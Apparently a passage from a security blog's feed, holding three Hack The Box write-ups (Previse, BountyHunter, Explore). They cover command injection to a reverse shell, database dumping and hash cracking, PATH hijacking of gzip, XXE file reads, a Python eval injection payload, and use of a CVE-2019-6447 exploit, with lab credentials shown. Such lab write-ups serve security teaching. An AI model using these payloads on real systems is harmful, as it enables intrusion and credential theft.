sizes="(min-width: 1200px) 1200px"></figure><p>In the backup we can see that the <code>config.php</code> file contains the DB credentials:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.27.06.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy" width="650" height="366" srcset="inesmartins.github.io/content/images/size/w600/2022/01/Screenshot-2022-01-02-at-11.27.06.png 600w, inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.27.06.png 650w"></figure><p>But the <code>logs.php</code> has the most potential, since there&apos;s a call to an <code>exec</code> function that uses a parameter sent via <code>POST</code> request:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.29.44.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy" width="891" height="582" srcset="inesmartins.github.io/content/images/size/w600/2022/01/Screenshot-2022-01-02-at-11.29.44.png 600w, inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.29.44.png 891w"></figure><p>We already know the format of this <code>POST</code> request since it&apos;s the one performed on the <code>file_logs.php</code> page:</p><pre><code class="language-prettyprint lang-sh">POST /logs.php HTTP/1.1
Host: previse.htb
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pt-PT,pt;q=0.8,en;q=0.5,en-US;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: http://previse.htb
Connection: close
Referer: http://previse.htb/file_logs.php
Cookie: PHPSESSID=prod44vfotfs0nvgir215458f0
Upgrade-Insecure-Requests: 1

delim=tab</code></pre><p>When we change this <code>delim</code> parameter to send a <code>curl</code> request to a simple local web server we get a ping back!</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-04-at-13.29.05.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy" width="1440" height="583" srcset="inesmartins.github.io/content/images/size/w600/2022/01/Screenshot-2022-01-04-at-13.29.05.png 600w, inesmartins.github.io/content/images/size/w1000/2022/01/Screenshot-2022-01-04-at-13.29.05.png 1000w, inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-04-at-13.29.05.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>So, let&apos;s go for the reverse shell:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-04-at-13.31.37.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy"></figure><p>We&apos;re in!</p><hr><h2 id="becoming-m4lwhere">Becoming m4lwhere</h2><p>First order of business: upgrade the shell!</p><pre><code class="language-prettyprint lang-python">~ python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;</code></pre><p>Let&apos;s see what else is there:</p><pre><code class="language-prettyprint lang-bsh">bash-4.4$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
m4lwhere:x:1000:1000:m4lwhere:/home/m4lwhere:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false</code></pre><p>We have access to <code>m4lwhere</code>&apos;s home directory, but not to the user flag:</p><pre><code class="language-prettyprint lang-bsh">bash-4.4$ cd /home/m4lwhere

bash-4.4$ ls
user.txt

bash-4.4$ cat user.txt
cat: user.txt: Permission denied</code></pre><p>Let&apos;s dump the database, since we already have the creds:</p><pre><code class="language-prettyprint lang-bsh">bash-4.4$ mysqldump -u root -p --all-databases &gt; db_dump.sql

Enter password: mySQL_p@ssw0rd!:)</code></pre><p>There&apos;s a hashed password for the <code>m4lwhere</code> user on the <code>accounts</code> table:</p><pre><code class="language-prettyprint lang-sql">CREATE TABLE `accounts` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(255) NOT NULL,
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=latin1;

INSERT INTO `accounts` VALUES 
(1,&apos;m4lwhere&apos;,&apos;$1$&#xF0;&#x178;&#xA7;&#x201A;llol$DQpmdvnb7EeuO6UaqRItf.&apos;,&apos;2021-05-27 18:18:36&apos;),
[...]</code></pre><p>Save me <code>hashcat</code>!</p><pre><code class="language-prettyprint lang-sh">~ nano hash

$1$&#x1F9C2;llol$DQpmdvnb7EeuO6UaqRItf.

~ hashcat -a 0 -m 500 hash ../seclists/pwds/rockyou.txt --show
$1$&#x1F9C2;llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!</code></pre><p>We got the password!</p><pre><code class="language-prettyprint lang-sh">~ ssh m4lwhere@previse.htb

m4lwhere@previse.htb&apos;s password: 
&gt; ilovecody112235!

[...]

bash-4.4$ cat user.txt 
cff266072b891cf5458d490516040d5b</code></pre><hr><h2 id="road-to-root">Road to root</h2><p>After some poking around I went back to the <code>/opt/script</code> directory:</p><pre><code class="language-prettyprint lang-bsh">bash-4.4$ cd /opt/scripts/

bash-4.4$ ls -la
total 16
drwxr-xr-x 2 root     root     4096 Jul 26 18:41 .
drwxr-xr-x 3 root     root     4096 Jul 26 18:41 ..
-rwxr-xr-x 1 root     root      486 Jun  6  2021 access_backup.sh
-rw-r--r-- 1 m4lwhere m4lwhere  320 Jun  6  2021 log_process.py</code></pre><p>The <code>access_backup.sh</code> file looks very interesting:</p><pre><code class="language-prettyprint lang-bsh">bash-4.4$ cat access_backup.sh
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we&apos;ll fix it later when there&apos;s time

gzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_file_access.gz</code></pre><p>OK, what if we poison the <code>gzip</code> binary:</p><pre><code class="language-prettyprint lang-bsh">bash-4.4$ which gzip
/bin/gzip

bash-4.4$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

bash-4.4$ echo &quot;rm /tmp/pwd&quot; &gt; /tmp/gzip
bash-4.4$ chmod 777 /tmp/gzip 
bash-4.4$ export PATH=/tmp:$PATH
bash-4.4$ cd /opt/scripts/
bash-4.4$ sudo ./access_backup.sh 
&gt; ilovecody112235!
bash-4.4$ cat /tmp/pwd 
b3ca53edb5aecbbc2cd1456f3454cb47</code></pre><p>We&apos;re done babyyyyy!</p><hr>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | BountyHunter]]></title><description><![CDATA[<blockquote>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/359">here</a>.</blockquote><h2 id="scanning">Scanning</h2><p>Like with most HTB machines, a quick scan only disclosed <code>SSH</code> running on port <code>22</code> and a web server running on port <code>80</code>:</p><pre><code class="language-prettyprint lang-sh">~ nmap 10.10.11.100

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

~ nmap 10.10.11.</code></pre>]]></description><link>inesmartins.github.io/htb-write-up-bountyhunter/</link><guid isPermaLink="false">613e61d1ca603212098f67b8</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Mon, 29 Nov 2021 23:14:17 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/12/Screenshot-2021-12-31-at-11.14.19.png" medium="image"/><content:encoded><![CDATA[<blockquote>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/359">here</a>.</blockquote><h2 id="scanning">Scanning</h2><img src="inesmartins.github.io/content/images/2021/12/Screenshot-2021-12-31-at-11.14.19.png" alt="HTB Write-up | BountyHunter"><p>Like with most HTB machines, a quick scan only disclosed <code>SSH</code> running on port <code>22</code> and a web server running on port <code>80</code>:</p><pre><code class="language-prettyprint lang-sh">~ nmap 10.10.11.100

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

~ nmap 10.10.11.100 -sC -sV -A -p 22,80

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters</code></pre><p>The website seems to be the corporate page for &quot;The B Team&quot;: they&apos;re bounty hunters, security researchers, and can also use Burp ... impressive stuff.</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-21.27.46.png" class="kg-image" alt="HTB Write-up | BountyHunter" loading="lazy" width="1440" height="732" srcset="inesmartins.github.io/content/images/size/w600/2021/09/Screenshot-2021-09-12-at-21.27.46.png 600w, inesmartins.github.io/content/images/size/w1000/2021/09/Screenshot-2021-09-12-at-21.27.46.png 1000w, inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-21.27.46.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>The &quot;Portal&quot; link sends us to a <code>portal.php</code> page, which itself links to a page that contains &quot;the bounty tracker&quot; - note that the portal itself is &quot;under development&quot;:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-21.28.45.png" class="kg-image" alt="HTB Write-up | BountyHunter" loading="lazy" width="1440" height="358" srcset="inesmartins.github.io/content/images/size/w600/2021/09/Screenshot-2021-09-12-at-21.28.45.png 600w, inesmartins.github.io/content/images/size/w1000/2021/09/Screenshot-2021-09-12-at-21.28.45.png 1000w, inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-21.28.45.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>The &quot;bounty tracker&quot; aka the &quot;Bounty Report System&quot; is hosted at <code>/log_submit.php</code> and is still in beta:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-21.29.09.png" class="kg-image" alt="HTB Write-up | BountyHunter" loading="lazy" width="1260" height="281" srcset="inesmartins.github.io/content/images/size/w600/2021/09/Screenshot-2021-09-12-at-21.29.09.png 600w, inesmartins.github.io/content/images/size/w1000/2021/09/Screenshot-2021-09-12-at-21.29.09.png 1000w, inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-21.29.09.png 1260w" sizes="(min-width: 1200px) 1200px"></figure><p>We&apos;re also able to navigate the <code>/resources</code> directory, which contains some interesting files:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-21.35.05.png" class="kg-image" alt="HTB Write-up | BountyHunter" loading="lazy"></figure><p>The most interesting, at first glance, seems to be this note:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-21.33.58.png" class="kg-image" alt="HTB Write-up | BountyHunter" loading="lazy"></figure><p>A lot to unpack here:</p><ul><li>there&apos;s a <code>test</code> account on the portal that supports <code>nopass</code>;</li><li>we should probably take a look at the &quot;tracker submit script&quot;;</li><li>this script is not yet connected to a DB;</li><li>there&apos;s a <code>developer</code> group somewhere, that used to have too many permissions.</li></ul><p>Running <code>nikto</code> we also found a <code>db.php</code> file:</p><pre><code class="language-prettyprint lang-sh">~ nikto -host 10.10.11.100
...
OSVDB-3093: /db.php: This might be interesting... has been seen in web logs from an unknown scanner.</code></pre><p>And indeed, unlike other random (non-existing) files, this one doesn&apos;t return <code>404</code>, but also doesn&apos;t return any data.</p><hr><h2 id="xxe-to-lfi">XXE to LFI</h2><p>The <code>/resources/bountylog.js</code> file seems to be the aforementioned &quot;tracker submit script&quot;. As you can see below, this script:</p><ul><li>takes the values from the form submitted on the <code>log_submit.php</code> page</li><li>builds an <code>XML</code> string</li><li><code>base64</code>-encodes this data</li><li>sends it to <code>/tracker_diRbPr00f314.php</code> via <code>POST</code> request</li></ul><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-21.39.13.png" class="kg-image" alt="HTB Write-up | BountyHunter" loading="lazy" width="658" height="452" srcset="inesmartins.github.io/content/images/size/w600/2021/09/Screenshot-2021-09-12-at-21.39.13.png 600w, inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-21.39.13.png 658w"></figure><p>In response, this <code>/tracker_diRbPr00f314.php</code> page displays the submitted data, and also an interesting message: &quot;If DB were ready, would have added: [...]&quot; - this lets us know that <strong>the DB is not yet configured</strong>:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-21.40.16.png" class="kg-image" alt="HTB Write-up | BountyHunter" loading="lazy" width="599" height="174"></figure><p>Since the data is sent via <code>XML</code> I wanted to see if I could manipulate this payload in a way that achieves <code>LFI</code> using <code>XXE</code>. As always, I created a Python script to help me test ideas out:</p><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/582a499b67c4a0c4d7507b0e0cb735de.js"></script><!--kg-card-end: html--><p>Turns out, the application <em>is</em> vulnerable to <code>XXE</code> - as an example we can see the output of the <code>/etc/passwd</code> file:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-18-at-13.22.35.png" class="kg-image" alt="HTB Write-up | BountyHunter" loading="lazy"></figure><hr><h2 id="lfi-to-rce">LFI to RCE</h2><p>After running this script with a few different <a href="https://github.com/danielmiessler/SecLists">SecLists</a> (and creating some lists of my own), I was able to get the exact Linux version:</p><pre><code class="language-prettyprint lang-sh">Linux version 5.4.0-80-generic (buildd@lcy01-amd64-030) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #90-Ubuntu SMP Fri Jul 9 22:49:44 UTC 2021</code></pre><p>... as well as the most interesting users:</p><pre><code class="language-prettyprint lang-sh"># /etc/passwd
...
root:x:0:0:root:/root:/bin/bash
development:x:1000:1000:Development:/home/development:/bin/bash
...</code></pre><p>After changing the script to use <code>php://filter/read=convert.base64-encode/resource=</code> instead of <code>file://</code> for files ending in <code>.php</code>, I also had access to all of the project&apos;s files, including the DB:</p><pre><code class="language-prettyprint lang-sh">~ python3 xxe-script.py -url http://10.10.11.100/tracker_diRbPr00f314.php -pathlist wordlists/custom-finding-webserver-files.txt
Checking /var/www/html/db.php
	File contains data!
Checking /var/www/html/index.php
	File contains data!
Checking /var/www/html/portal.php
	File contains data!
Checking /var/www/html/log_submit.php
	File contains data!
Checking /var/www/html/tracker_diRbPr00f314.php
	File contains data!
Checking /var/www/html/resources/README.txt
	File contains data!
Checking /var/www/html/resources/lato.css
	File contains data!
Checking /var/www/html/resources/monsterat.css
	File contains data!
Checking /var/www/html/resources/all.js
Checking /var/www/html/resources/bootstrap.bundle.min.js
Checking /var/www/html/resources/bootstrap_login.min.js
Checking /var/www/html/resources/bountylog.js
Checking /var/www/html/resources/jquery.easing.min.js
Checking /var/www/html/resources/jquery.min.js
Checking /var/www/html/resources/jquery_login.min.js</code></pre><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-18-at-18.38.19.png" class="kg-image" alt="HTB Write-up | BountyHunter" loading="lazy"></figure><p>Luckily for us, someone used the same creds for the DB and <code>SSH</code> access, so I got a shell:</p><pre><code class="language-prettyprint lang-sh">~ ssh development@10.10.11.100
&gt; m19RoAU0hP41A1sTsq6K</code></pre><hr><h2 id="r00ting">R00ting</h2><p>Once in the user&apos;s <code>/home</code> directory, I could see a message from John to other developers:</p><pre><code class="language-prettyprint lang-sh">~ ls -la
lrwxrwxrwx 1 root        root           9 Apr  5 22:53 .bash_history -&gt; /dev/null
-rw-r--r-- 1 development development  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 development development 3771 Feb 25  2020 .bashrc
drwx------ 2 development development 4096 Apr  5 22:50 .cache
lrwxrwxrwx 1 root        root           9 Jul  5 05:46 .lesshst -&gt; /dev/null
drwxrwxr-x 3 development development 4096 Apr  6 23:34 .local
-rw-r--r-- 1 development development  807 Feb 25  2020 .profile
drwx------ 2 development development 4096 Apr  7 01:48 .ssh
-rw-r--r-- 1 root        root         471 Jun 15 16:10 contract.txt
-r--r----- 1 root        development   33 Sep 19 06:18 user.txt</code></pre><pre><code class="language-prettyprint lang-sh">$ cat contract.txt
Hey team,

I&apos;ll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the &quot;rm -rf&quot; incident and we can&apos;t mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John</code></pre><p>John seems to be referring to some &quot;internal tool&quot; sent by &quot;Skytrain Inc&quot;, so I tried to find any other reference to this company. Under <code>/opt</code> I got some interesting matches:</p><pre><code class="language-prettyprint lang-sh">$ grep -Rils &apos;Skytrain&apos; /opt

/opt/skytrain_inc/ticketValidator.py
/opt/skytrain_inc/invalid_tickets/390681613.md
/opt/skytrain_inc/invalid_tickets/734485704.md
/opt/skytrain_inc/invalid_tickets/529582686.md
/opt/skytrain_inc/invalid_tickets/600939065.md</code></pre><p>The <code>ticketValidator.py</code> seems interesting:</p><pre><code class="language-prettyprint lang-sh">~ ls -la /opt/skytrain_inc/ticketValidator.py
-r-xr--r-- 1 root root 1471 Jul 22 11:08 /opt/skytrain_inc/ticketValidator.py</code></pre><p>When we run it using some of the tickets in the same directory, we see that these tickets are invalid:</p><pre><code class="language-prettyprint lang-sh">$ python3 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/opt/skytrain_inc/invalid_tickets/390681613.md
Destination: New Haven
Invalid ticket.

$ python3 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/opt/skytrain_inc/invalid_tickets/734485704.md
Destination: Bridgeport
Invalid ticket.</code></pre><p>Let&apos;s take a closer look at the script to see if we&apos;re able to abuse it:</p><pre><code class="language-pythonprettyprint lang-python">#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(&quot;.md&quot;):
        return open(loc, &apos;r&apos;)
    else:
        print(&quot;Wrong file type.&quot;)
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith(&quot;# Skytrain Inc&quot;):
                return False
            continue
        if i == 1:
            if not x.startswith(&quot;## Ticket to &quot;):
                return False
            print(f&quot;Destination: {&apos; &apos;.join(x.strip().split(&apos; &apos;)[3:])}&quot;)
            continue

        if x.startswith(&quot;__Ticket Code:__&quot;):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith(&quot;**&quot;):
                return False
            ticketCode = x.replace(&quot;**&quot;, &quot;&quot;).split(&quot;+&quot;)[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace(&quot;**&quot;, &quot;&quot;))
                if validationNumber &gt; 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input(&quot;Please enter the path to the ticket file.\n&quot;)
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print(&quot;Valid ticket.&quot;)
    else:
        print(&quot;Invalid ticket.&quot;)
    ticket.close

main()
</code></pre><p>After some local tests I was able to create a valid payload, but I was still unable to get the root flag, due to a &quot;Permission denied&quot; exception:</p><pre><code class="language-prettyprint lang-sh"># Skytrain Inc
## Ticket to Bridgeport
__Ticket Code:__
**18 + __import__(&apos;os&apos;).system(&apos;cat /root/root.txt&apos;)**
##Issued: 2021/06/21
#End Ticket</code></pre><p>After using <code>linpeas.sh</code> I realised that I was able to execute a very specific command as <code>sudo</code>:</p><pre><code class="language-prettyprint lang-sh">User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py</code></pre><p>Using this privileged command, I was able to get the flag:</p><pre><code class="language-prettyprint lang-sh">$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/tmp/malicious.md
Destination: Bridgeport
c70cb6e9f9e9a923d6718090a3f74d33
Invalid ticket.</code></pre><hr><h2 id="references">References</h2><ul><li><a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</a></li><li><a href="https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2">https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2</a></li><li><a href="https://resources.infosecinstitute.com/topic/local-file-inclusion-code-execution/">https://resources.infosecinstitute.com/topic/local-file-inclusion-code-execution/</a></li></ul>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Explore]]></title><description><![CDATA[<blockquote>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/356">here</a>.</blockquote><h2 id="esketit"><a href="https://www.urbandictionary.com/define.php?term=esketit">esketit</a></h2><p>Let&apos;s start with some basic scanning:</p><pre><code>~ nmap -A 10.10.10.247

PORT     STATE    SERVICE    VERSION
2222/tcp open     ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:</code></pre>]]></description><link>inesmartins.github.io/htb-write-up-explore/</link><guid isPermaLink="false">60df5ec80bafc20a7e3c4b50</guid><category><![CDATA[android]]></category><category><![CDATA[htb]]></category><category><![CDATA[ssh]]></category><category><![CDATA[adb]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 30 Oct 2021 19:10:00 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-01-at-15.59.58.png" medium="image"/><content:encoded><![CDATA[<blockquote>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/356">here</a>.</blockquote><h2 id="esketit"><a href="https://www.urbandictionary.com/define.php?term=esketit">esketit</a></h2><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-01-at-15.59.58.png" alt="HTB Write-up | Explore"><p>Let&apos;s start with some basic scanning:</p><pre><code>~ nmap -A 10.10.10.247

PORT     STATE    SERVICE    VERSION
2222/tcp open     ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
5555/tcp filtered freeciv</code></pre><p>On Android, the <code>5555</code> TCP port is usually open when the <a href="https://developer.android.com/studio/command-line/adb">Android Debug Bridge</a> Daemon (ADBD) is running, however, in this case the port is filtered.</p><p>Let&apos;s focus on the other port: the <code>SSH</code> Server application from &quot;Banana Studio&quot; is &#xA0;<a href="https://play.google.com/store/apps/details?id=net.xnano.android.sshserver.tv">available on Play Store</a> and, as you can see below, supports anonymous login (&quot;username=<code>ssh</code> without any password&quot;):</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-11-at-16.23.28.png" class="kg-image" alt="HTB Write-up | Explore" loading="lazy" width="534" height="102"></figure><p>However, it seems like this anonymous login is disabled. I was also not able to brute-force the password using <a href="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt">a relevant SecList</a>:</p><pre><code>~ hydra -l ssh -P ssh-passwords.txt -s 2222 -t 16 10.10.10.247 ssh</code></pre><p>Let&apos;s expand our scanning to see what else is open:</p><pre><code>~ nmap -p 1-65535 10.10.10.247

2222/tcp open     ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
5555/tcp filtered freeciv
59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn&apos;t have a title (text/plain).</code></pre><p>Nice, another port!</p><p>Doing a bit of Googling we come across <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6447">CVE-2019-6447</a>:</p><blockquote>The ES File Explorer File Manager application through 4.1.9.7.4 for Android allows remote attackers to read arbitrary files or execute applications via TCP port 59777 requests on the local Wi-Fi network. This TCP port remains open after the ES application has been launched once, and responds to unauthenticated application/json data over HTTP.</blockquote><p>In order to exploit this misconfiguration, we can use <a href="https://www.exploit-db.com/exploits/50070">this</a> exploit.</p><p>After some trial and error, and with a bit of luck, I came across the user flag:</p><pre><code>~ python3 50070.py getFile 10.10.10.247 /sdcard/user.txt 

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

[+] Downloading file...
[+] Done. Saved as `out.dat`.

~ htb_explore cat out.dat                                           
f32017174c7c7e8f50c6da52891ae250</code></pre><hr><h2 id="road-to-root">Road to root</h2><p>Let&apos;s continue enumerating using the other available commands for this script:</p><pre><code>~ python3 50070.py listPics 10.10.10.247

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

...
name : creds.jpg
time : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size : 1.14 MB (1,200,401 Bytes)
...</code></pre><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-01-at-15.28.01.png" class="kg-image" alt="HTB Write-up | Explore" loading="lazy" width="908" height="300" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-01-at-15.28.01.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-01-at-15.28.01.png 908w" sizes="(min-width: 720px) 720px"></figure><p>And we got a winner!</p><pre><code>~ ssh kristi@10.10.10.247 -p 2222
&gt; Kr1sT!5h@Rp3xPl0r3!

$ whoami
u0_a76</code></pre><p>Now that we have access to some <code>SSH</code> credentials, let&apos;s forward the traffic from the machine&apos;s <code>adb</code> service to a local port:</p><pre><code>~ adb start-server
* daemon not running; starting now at tcp:5037
* daemon started successfully

~ ssh -i ssh_key kristi@10.10.10.247 -L 5555:127.0.0.1:5555 -p 2222
&gt; Kr1sT!5h@Rp3xPl0r3!

$ whoami
u0_a76</code></pre><p>Then, on another tab on the local machine we can connect to the local service:</p><pre><code>~ adb connect 127.0.0.1:5555
connected to 127.0.0.1:5555

~ adb shell

$ whoami
shell</code></pre><p>Now let&apos;s see if we can authenticate as <code>root</code>:</p><pre><code>$ su - root

$ whoami
root

$ cd data      

$ ls
adb           bootchart     media       property       tombstones 
anr           cache         mediadrm    resource-cache user       
app           dalvik-cache  misc        root.txt       user_de    
app-asec      data          misc_ce     ss             vendor     
app-ephemeral drm           misc_de     ssh_starter.sh vendor_ce  
app-lib       es_starter.sh nfc         system         vendor_de  
app-private   local         ota         system_ce      
backup        lost+found    ota_package system_de      

$ cat root.txt
